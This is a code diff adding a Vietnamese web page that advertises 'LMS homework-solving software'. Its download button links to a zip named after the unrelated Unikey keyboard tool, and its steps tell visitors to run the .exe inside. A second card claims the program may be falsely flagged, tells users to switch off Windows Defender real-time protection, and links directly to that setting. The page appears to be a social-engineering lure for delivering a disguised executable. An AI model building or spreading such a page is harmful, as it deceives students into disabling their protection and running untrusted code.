@@ -1,1 +1,229 @@
-chào
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tải Về - Phần Mềm Giải Bài Tập LMS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --background-start: #111;
+            --background-end: #1e1e2f;
+            --glass-bg: rgba(30, 30, 47, 0.6);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --text-primary: #f0f0f0;
+            --text-secondary: #a0a0b0;
+            --accent-start: #6a11cb;
+            --accent-end: #2575fc;
+            --shadow: rgba(0, 0, 0, 0.3);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, var(--background-start), var(--background-end));
+            color: var(--text-primary);
+            margin: 0;
+            padding: 2rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 850px;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 2.5rem 3rem;
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            box-shadow: 0 8px 32px 0 var(--shadow);
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .header h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, var(--accent-start), var(--accent-end));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 0 0 0.5rem 0;
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .main-download {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        
+        .download-button {
+            display: inline-block;
+            text-decoration: none;
+            color: #fff;
+            font-size: 1.25rem;
+            font-weight: 600;
+            padding: 1rem 2.5rem;
+            border-radius: 50px;
+            background: linear-gradient(90deg, var(--accent-start), var(--accent-end));
+            box-shadow: 0 5px 20px rgba(37, 117, 252, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .download-button:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 8px 25px rgba(106, 17, 203, 0.5);
+        }
+
+        .instructions-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2.5rem;
+            border-top: 1px solid var(--glass-border);
+            padding-top: 2.5rem;
+        }
+        
+        .instruction-card {
+            background: rgba(0, 0, 0, 0.1);
+            padding: 1.5rem;
+            border-radius: 15px;
+        }
+
+        .instruction-card h2 {
+            font-size: 1.5rem;
+            margin-top: 0;
+            margin-bottom: 1.5rem;
+            border-bottom: 2px solid var(--accent-end);
+            padding-bottom: 0.5rem;
+            display: inline-block;
+        }
+
+        .instruction-card ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .instruction-card li {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+            font-size: 1rem;
+        }
+
+        .step-number {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 25px;
+            height: 25px;
+            min-width: 25px;
+            background: var(--accent-start);
+            color: #fff;
+            border-radius: 50%;
+            font-weight: 600;
+            margin-right: 1rem;
+            font-size: 0.9rem;
+        }
+        
+        .security-button {
+            display: inline-block;
+            text-decoration: none;
+            color: #fff;
+            width: 100%;
+            text-align: center;
+            font-size: 1rem;
+            font-weight: 600;
+            padding: 0.8rem 1rem;
+            border-radius: 10px;
+            border: 2px solid var(--accent-end);
+            background: transparent;
+            transition: all 0.3s ease;
+            margin-top: 1.5rem;
+        }
+        
+        .security-button:hover {
+            background: var(--accent-end);
+            color: #fff;
+        }
+        
+        .final-note {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            font-style: italic;
+        }
+
+        @media (max-width: 768px) {
+            .instructions-grid {
+                grid-template-columns: 1fr;
+            }
+            .header h1 {
+                font-size: 2.2rem;
+            }
+            .container {
+                padding: 2rem 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header class="header">
+            <h1>Phần Mềm Giải Bài Tập LMS</h1>
+            <p>Trải nghiệm công cụ hỗ trợ học tập đỉnh cao, giúp bạn xử lý bài tập nhanh chóng và chính xác. Sẵn sàng để bắt đầu?</p>
+        </header>
+
+        <section class="main-download">
+            <a href="https://api.ictu.online/phanmemgiailms/Unikey%204.9%20RC2.zip" class="download-button">🚀 Tải Về Phiên Bản Mới Nhất</a>
+        </section>
+
+        <section class="instructions-grid">
+            <div class="instruction-card">
+                <h2>⚙️ Cài Đặt Nhanh</h2>
+                <ul>
+                    <li><span class="step-number">1</span><div><strong>Tải xuống:</strong> Nhấn nút tải về ở trên để lấy tệp <code>.zip</code>.</div></li>
+                    <li><span class="step-number">2</span><div><strong>Giải nén:</strong> Chuột phải vào tệp và chọn "Extract All..." để giải nén.</div></li>
+                    <li><span class="step-number">3</span><div><strong>Khởi chạy:</strong> Mở thư mục mới và chạy file <code>.exe</code> để bắt đầu.</div></li>
+                    <li><span class="step-number">4</span><div><strong>Đăng nhập:</strong> Sử dụng tài khoản của bạn và khám phá các tính năng.</div></li>
+                </ul>
+            </div>
+            
+            <div class="instruction-card">
+                <h2>🛡️ Xử Lý Trình Diệt Virus</h2>
+                <ul>
+                    <li><span class="step-number">1</span><div>Phần mềm có thể bị nhận diện nhầm. Bạn cần tạm tắt bảo vệ thời gian thực.</div></li>
+                    <li><span class="step-number">2</span><div>Nhấn nút bên dưới để đi thẳng đến cài đặt bảo mật của Windows.</div></li>
+                    <li><span class="step-number">3</span><div>Tại mục "Virus & threat protection settings", tìm và gạt tắt <strong>Real-time protection</strong>.</div></li>
+                </ul>
+                <a href="ms-settings:windowsdefender" class="security-button">Mở thẳng Cài đặt Bảo mật</a>
+                <p class="final-note">Đừng quên bật lại sau khi cài đặt xong!</p>
+            </div>
+        </section>
+    </div>
+
+</body>
+</html>
